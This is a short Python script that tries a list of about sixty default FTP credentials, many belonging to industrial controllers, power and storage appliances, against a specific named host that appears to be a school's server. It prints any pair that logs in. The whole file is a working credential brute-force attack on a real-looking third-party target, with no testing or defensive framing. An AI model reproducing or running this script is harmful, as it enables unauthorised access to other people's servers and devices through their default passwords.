import threading
import requests
import ftplib

dictionary = """anonymous:anonymous
root:rootpasswd
root:12hrs37
ftp:b1uRR3
admin:admin
localadmin:localadmin
admin:1234
apc:apc
admin:nas
Root:wago
Admin:wago
User:user
Guest:guest
ftp:ftp
admin:password
a:avery
admin:123456
adtec:none
admin:admin12345
none:dpstelecom
instrument:instrument
user:password
root:password
default:default
admin:default
nmt:1234
admin:Janitza
supervisor:supervisor
user1:pass1
avery:avery
IEIeMerge:eMerge
ADMIN:12345
beijer:beijer
Admin:admin
admin:1234
admin:1111
root:admin
se:1234
admin:stingray
device:apc
apc:apc
dm:ftp
dmftp:ftp
httpadmin:fhttpadmin
user:system
MELSEC:MELSEC
QNUDECPU:QNUDECPU
ftp_boot:ftp_boot
uploader:ZYPCOM
ftpuser:password
USER:USER
qbf77101:hexakisoctahedron
ntpupdate:ntpupdate
sysdiag:factorycast@schneider
wsupgrade:wsupgrade
pcfactory:pcfactory
loader:fwdownload
test:testingpw
webserver:webpages
fdrusers:sresurdf
nic2212:poiuypoiuy
user:user00
su:ko2003wa
MayGion:maygion.com
admin:9999
PlcmSpIp:PlcmSpIp"""

dictionary = dictionary.split("\n")
dictionary = [i.split(":") for i in dictionary]




for i in dictionary:
    try:
        print(i)
        ftp = ftplib.FTP("informatika.gymtri.cz", i[0], i[1])
        
    except:
        continue
    print(i)
    
